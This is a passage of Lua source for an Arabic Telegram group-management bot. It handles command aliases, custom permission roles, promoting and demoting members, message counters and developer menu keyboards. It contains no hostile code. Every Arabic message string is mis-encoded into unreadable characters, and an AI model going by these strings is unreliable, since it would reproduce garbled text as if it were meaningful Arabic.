DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุุ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุฑุฏ","ุงุถู ุฑุฏ")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุฑุฏ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุณุญ","ูุณุญ ุณุญูุงุชู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุณุญ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุฑุณ","ูุณุญ ุฑุณุงุฆูู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุฑุณ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":ุบ","ุบูููู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"ุบ")
DevRio:set(Rinda.."Set:Cmd:Group:New1"..msg.chat_id_..":#","ูุณุญ ูุงุฆูู ุงูุนุงู")
DevRio:sadd(Rinda.."List:Cmd:Group:New"..msg.chat_id_,"#")
send(msg.chat_id_, msg.id_,"โ๏ธฐุชู ุชุฑุชูุจ ุงูุงูุงูุฑ ุจุงูุดูู ุงูุชุงูู ~\nโ๏ธฐ ุงูุฏู - ุง .\nโ๏ธฐ ุฑูุน ูููุฒ - ู .\nโ๏ธฐุฑูุน ุงุฏูู - ุงุฏ .\nโ๏ธฐ ุฑูุน ูุฏูุฑ - ูุฏ . \nโ๏ธฐ ุฑูุน ููุดู - ูู . \nโ๏ธฐ ุฑูุน ููุดุฆ ุงูุงุณุงุณู - ุงุณ  .\nโ๏ธฐ ุฑูุน ูุทูุฑ - ูุท .\nโ๏ธฐุฑูุน ูุทูุฑ ุซุงููู - ุซุงููู .\nโ๏ธฐ ุชูุฒูู ุงููู - ุชู .\nโ๏ธฐ ุชุนุทูู ุงูุงูุฏู ุจุงูุตูุฑู - ุชุนุท .\nโ๏ธฐ ุชูุนูู ุงูุงูุฏู ุจุงูุตูุฑู - ุชูุน .\nโ๏ธฐ ุงูุฑุงุจุท - ุฑ .\nโ๏ธฐ ุฑุฏูุฏ ุงููุฏูุฑ - ุฑุฑ .\nโ๏ธฐ ูุณุญ ุงูููุชูููู - ุุ .\nโ๏ธฐ ุงุถู ุฑุฏ - ุฑุฏ .\nโ๏ธฐ ูุณุญ ุณุญูุงุชู - ุณุญ .\nโ๏ธฐ ูุณุญ ุฑุณุงุฆูู - ุฑุณ .\nโ๏ธฐ ุบูููู - ุบ .\nโ๏ธฐูุณุญ ูุงุฆูู ุงูุนุงู")  
end
if text == "ุงุถู ุงูุฑ" and ChCheck(msg) or text == "ุงุถุงูุฉ ุงูุฑ" and ChCheck(msg) or text == "ุงุถุงูู ุงูุฑ" and ChCheck(msg) then
DevRio:set(Rinda.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ุงูุงูุฑ ุงููุฏูู", 1, 'html')
return false
end
if text == "ุญุฐู ุงูุฑ" and ChCheck(msg) or text == "ูุณุญ ุงูุฑ" and ChCheck(msg) then 
DevRio:set(Rinda.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ุงูุงูุฑ ุงูุฐู ููุช ุจุงุถุงูุชู ูุฏููุง", 1, 'html')
return false
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if text == "ุงูุตูุงุญูุงุช" and ChCheck(msg) or text == "ุตูุงุญูุงุช" and ChCheck(msg) then 
local List = DevRio:smembers(Rinda.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชูุฌุฏ ุตูุงุญูุงุช ูุถุงูู", 1, 'html')
return false
end
t = "โ๏ธฐูุงุฆูุฉ ุงูุตูุงุญูุงุช ุงููุถุงูู โขโฏ\n-----------------------------------------\n"
for k,v in pairs(List) do
var = DevRio:get(Rinda.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." โข ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
end
end
Dev_Rio(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "ุญุฐู ุงูุตูุงุญูุงุช" and ChCheck(msg) or text == "ูุณุญ ุงูุตูุงุญูุงุช" and ChCheck(msg) then
local List = DevRio:smembers(Rinda.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Rinda.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevRio:del(Rinda.."Coomds"..msg.chat_id_)
end
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู ุงูุตูุงุญูุงุช ุงููุถุงูู", 1, 'html')
end
end
if text and text:match("^ุงุถู ุตูุงุญูู (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^ุงุถู ุตูุงุญูู (.*)$")
DevRio:set(Rinda.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevRio:sadd(Rinda.."Coomds"..msg.chat_id_,ComdNew)  
DevRio:setex(Rinda.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุงุฑุณู ููุน ุงูุตูุงุญูู \n{ ุนุถู โข ูููุฒ  โข ุงุฏูู  โข ูุฏูุฑ }\nโ๏ธฐุงุฑุณู ุงูุบุงุก ูุงูุบุงุก ุงูุงูุฑ ", 1, 'html')
end
if text and text:match("^ุญุฐู ุตูุงุญูู (.*)$") and ChCheck(msg) or text and text:match("^ูุณุญ ุตูุงุญูู (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^ุญุฐู ุตูุงุญูู (.*)$") or text:match("^ูุณุญ ุตูุงุญูู (.*)$")
DevRio:del(Rinda.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุญุฐู ุงูุตูุงุญูู", 1, 'html')
end
if DevRio:get(Rinda.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^โข ุงูุบุงุก โ$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงูุบุงุก ุงูุงูุฑ", 1, 'html')
DevRio:del(Rinda.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "ูุฏูุฑ" then
if not Constructor(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชุณุชุทูุน ุงุถุงูุฉ ุตูุงุญูุฉ ( ุนุถู โข ูููุฒ  โข ุงุฏูู )\nโ๏ธฐุงุฑุณุงู ููุน ุงูุตูุงุญูู ุบูเขชูู", 1, 'html')
return false
end
end
if text == "ุงุฏูู" then
if not Manager(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชุณุชุทูุน ุงุถุงูุฉ ุตูุงุญูุฉ ( ุนุถู โข ูููุฒ )\nโ๏ธฐุงุฑุณุงู ููุน ุงูุตูุงุญูู ุบูเขชูู", 1, 'html')
return false
end
end
if text == "ูููุฒ" then
if not Admin(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชุณุชุทูุน ุงุถุงูุฉ ุตูุงุญูุฉ ( ุนุถู )\nโ๏ธฐุงุฑุณุงู ููุน ุงูุตูุงุญูู ุบูเขชูู", 1, 'html')
return false
end
end
if text == "ูุฏูุฑ" or text == "ุงุฏูู" or text == "ูููุฒ" or text == "ุนุถู" then
local textn = DevRio:get(Rinda.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevRio:set(Rinda.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐุชู ุงุถุงูุฉ ุงูุตูุงุญูู", 1, 'html')
DevRio:del(Rinda.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("ุฑูุน (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_RIO = text:match("ุฑูุน (.*)")
if DevRio:sismember(Rinda.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(Rinda.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "ูููุฒ" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุฑูุนู โจ '..DEV_RIO..' โฉ ุถูุนู', 1, 'md')
DevRio:set(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevRio:sadd(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ุงุฏูู" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุฑูุนู โจ '..DEV_RIO..' โฉ ุถูุนู', 1, 'md')
DevRio:set(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ูุฏูุฑ" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุฑูุนู โจ '..DEV_RIO..' โฉ ุถูุนู', 1, 'md')
DevRio:set(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)  
DevRio:sadd(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ุนุถู" then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุฑูุนู โจ '..DEV_RIO..' โฉ ุถูุนู', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("ุชูุฒูู (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_RIO = text:match("ุชูุฒูู (.*)")
if DevRio:sismember(Rinda.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(Rinda.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "ูููุฒ" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุชูุฒููู โจ '..DEV_RIO..' โฉ ุถูุนู', 1, 'md')
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ุงุฏูู" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุชูุฒููู โจ '..DEV_RIO..' โฉ ุถูุนู', 1, 'md')
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ูุฏูุฑ" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุชูุฒููู โจ '..DEV_RIO..' โฉ ุถูุนู', 1, 'md')
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "ุนุถู" then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..data.first_name_..'](t.me/'..(data.username_ or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุชูุฒููู โจ '..DEV_RIO..' โฉ ุถูุนู', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^ุฑูุน (.*) @(.*)") then 
local text1 = {string.match(text, "^(ุฑูุน) (.*) @(.*)$")}
if DevRio:sismember(Rinda.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(Rinda.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "ูููุฒ" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..result.title_..'](t.me/'..(text1[3] or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุฑูุนู โจ '..text1[2]..' โฉ ุถูุนู', 1, 'md')
DevRio:sadd(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:set(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ุงุฏูู" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..result.title_..'](t.me/'..(text1[3] or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุฑูุนู โจ '..text1[2]..' โฉ ุถูุนู', 1, 'md')
DevRio:sadd(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:set(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ูุฏูุฑ" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..result.title_..'](t.me/'..(text1[3] or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุฑูุนู โจ '..text1[2]..' โฉ ุถูุนู', 1, 'md')
DevRio:sadd(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:set(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ุนุถู" then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..result.title_..'](t.me/'..(text1[3] or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุฑูุนู โจ '..text1[2]..' โฉ ุถูุนู', 1, 'md')
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^ุชูุฒูู (.*) @(.*)") then 
local text1 = {string.match(text, "^(ุชูุฒูู) (.*) @(.*)$")}
if DevRio:sismember(Rinda.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(Rinda.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "ูููุฒ" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..result.title_..'](t.me/'..(text1[3] or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุชูุฒููู โจ '..text1[2]..' โฉ ุถูุนู', 1, 'md')
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:del(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ุงุฏูู" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..result.title_..'](t.me/'..(text1[3] or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุชูุฒููู โจ '..text1[2]..' โฉ ุถูุนู', 1, 'md')
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:del(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ูุฏูุฑ" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..result.title_..'](t.me/'..(text1[3] or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุชูุฒููู โจ '..text1[2]..' โฉ ุถูุนู', 1, 'md')
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:del(Rinda.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ุนุถู" then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงูุนุถู โข โจ ['..result.title_..'](t.me/'..(text1[3] or 'Source_Rinda')..')'..' โฉ\nโ๏ธฐุชู ุชูุฒููู โจ '..text1[2]..' โฉ ุถูุนู', 1, 'md')
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*", 1, 'md')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevRio:incr(Rinda..'Rio:UsersMsgs'..Rinda..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Rinda..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(Rinda..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevRio:sismember(Rinda.."Rio:Users",msg.chat_id_) then
DevRio:sadd(Rinda.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
end
end 
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if ChatType == 'pv' then 
if text == '/start' or text == 'โข ุฑุฌูุน โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐูุฑุญุจุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงูุช ุงููุทูุฑ ุงูุงุณุงุณู ููุง \nโ๏ธฐุงููู ุงุฒุฑุงุฑ ุณูุฑุณ ุฑููุฏุง \nโ๏ธฐุชุณุชุทูุน ุงูุชุญูู ุจูู ุงูุงูุงูุฑ ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุงูุณูุฑุณ โ','ูุถุน ุงุณู ุงูุจูุช'},{'โข  ุงููุทูุฑูู โ','โข ุงูุงุญุตุงุฆูุงุช โ'},{'โข ุงูุชูุนูู ูุงูุชุนุทูู โ','โข ุงูุงุฐุงุนู โ'},{'โข ุชุนููู ููุงูุด ุงูุงูุงูุฑ โ','โข ุงูุนุงู โ','โข ุฑุฏูุฏ ุงูุฎุงุต โ'},{'โข ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู โ','โข ุงูุงูุงูุฑ ุงูุฎุฏููู โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุชุนููู ููุงูุด ุงูุงูุงูุฑ โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุชุนุฏูู ูุชุบููุฑ ููุงูุด ุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'ุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ'},{'ุญุฐู ูููุดุฉ ุงูุงูุฏู','ุชุนููู ูููุดุฉ ุงูุงูุฏู'},{'ุชุนููู ุงูุฑ ุงูุงูุงูุฑ'},{'ุชุนููู ุงูุฑ ู3','ุชุนููู ุงูุฑ ู2','ุชุนููู ุงูุฑ ู1'},{'ุชุนููู ุงูุฑ ู6','ุชุนููู ุงูุฑ ู5','ุชุนููู ุงูุฑ ู4'},{'ุงุณุชุนุงุฏุฉ ููุงูุด ุงูุงูุงูุฑ'},{'โข ุฑุฌูุน โ'}}

SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุงูุณูุฑุณ โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุชุญุฏูุซ  ุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุชุญุฏูุซ ุฑููุฏุง โ','โข ุชุญุฏูุซ โ'},{'โข ุงูุณูุฑูุฑ โ'},{'โข ูุจุฑูุฌ ุงูุณูุฑุณ โ','โข ููุงุฉ ุงูุณูุฑุณ โ'},{'โข  ุงูุณูุฑุณ โ'},{'โข ุฑุฌูุน โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุงูุงุญุตุงุฆูุงุช โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจ ุฃุญุตุงุฆูุงุช  ุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข  ุงูุงุญุตุงุฆูุงุช โ'},{'โข ุงููุดุชุฑููู โ','โข ุงููุฌููุนุงุช โ'},{'โข ุฑูุงุจุท ุงููุฌููุนุงุช โ','โข ุฌูุจ ูุณุฎู ุงุญุชูุงุทูู โ'},{'โข ุชูุธูู ุงููุดุชุฑููู โ','โข ุชูุธูู ุงููุฌููุนุงุช โ'},{'โข ููู ุงูุงุญุตุงุฆูุงุช โ'},{'โข ุฑุฌูุน โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข  ุงููุทูุฑูู โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจ ุงููุทูุฑูู ูุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุงูุงุณุงุณููู โ','ูุณุญ ุงูุงุณุงุณููู'},{'โข ุงูุซุงููููู โ','ูุณุญ ุงูุซุงููููู'},{'โข ุงููุทูุฑูู โ','ูุณุญ ุงููุทูุฑูู'},{'โข ุชุบูุฑ ุงููุทูุฑ ุงูุงุณุงุณู โ','โข ุชุบููุฑ ูููุดู ุงููุทูุฑ โ'},{'โข ุฑุฌูุน โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุงูุชูุนูู ูุงูุชุนุทูู โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจ ุงูุชูุนูู ูุงูุชุนุทูู ูุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุชุนุทูู ุงูุชูุงุตู โ','โข ุชูุนูู ุงูุชูุงุตู โ'},{'โข ุชุนุทูู ุชุฑุญูุจ ุงูุจูุช โ','โข ุชูุนูู ุชุฑุญูุจ ุงูุจูุช โ'},{'โข ุชุนุทูู ุงููุบุงุฏุฑู โ','โข ุชูุนูู ุงููุบุงุฏุฑู โ'},{'โข ุชุนุทูู ุงูุงุฐุงุนู โ','โข ุชูุนูู ุงูุงุฐุงุนู โ'},{'โข ุชุนุทูู ุงูุจูุช ุงูุฎุฏูู โ','โข ุชูุนูู ุงูุจูุช ุงูุฎุฏูู โ'},{'โข ุชุนุทูู ุงููุณุฎู ุงูุชููุงุฆูู โ','โข ุชูุนูู ุงููุณุฎู ุงูุชููุงุฆูู โ'},{'โข ุฑุฌูุน โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุงูุงุฐุงุนู โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุงูุงุฐุงุนู ูุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุงุฐุงุนู ุจุงูุชุซุจูุช โ'},{'โข ุงุฐุงุนู ุฎุงุต โ','โข ุงุฐุงุนู ุนุงู โ'},{'โข ุงุฐุงุนู ุฎุงุต ุจุงูุชูุฌูู โ','โข ุงุฐุงุนู ุนุงู ุจุงูุชูุฌูู โ'},{'ุงูุบุงุก'},{'โข ุฑุฌูุน โ'},}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุงูุนุงู โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุงูุนุงู ูุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุงุถู ุฑุฏ ุนุงู โ','โข ุญุฐู ุฑุฏ ุนุงู โ'},{'โข ุฑุฏูุฏ ุงูุนุงู โ','โข ูุณุญ ุฑุฏูุฏ ุงูุนุงู โ'},{'โข ูุงุฆูู ุงูุนุงู โ','ูุณุญ ูุงุฆูู ุงูุนุงู'},{'โข ุฑุฌูุน โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุฑุฏูุฏ ุงูุฎุงุต โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุฑุฏูุฏ ุงูุฎุงุต ูุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
local key = {{'โข ุชุนููู ุฑุฏ ุงูุฎุงุต โ','โข ุญุฐู ุฑุฏ ุงูุฎุงุต โ'},{'โข ุฌูุจ ุฑุฏ ุงูุฎุงุต โ'},{'โข ุฑุฌูุน โ'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end end
if text == 'โข ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู โ' then 
if SecondSudo(msg) then 
local Sudo_Welcome = 'โ๏ธฐุงููุง ุจู ูุฌุฏุฏุง ุนุฒูุฒู ุงููุทูุฑ \nโ๏ธฐุงููู ุงูุงุฒุฑุงุฑ ุงูุฎุงุตู ุจุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู ูุณูุฑุณ ุฑููุฏุง ููุท ุงุถุบุท ุนูู ุงูุงูุฑ ุงูุฐู ุชุฑูุฏ ุชูููุฐู'
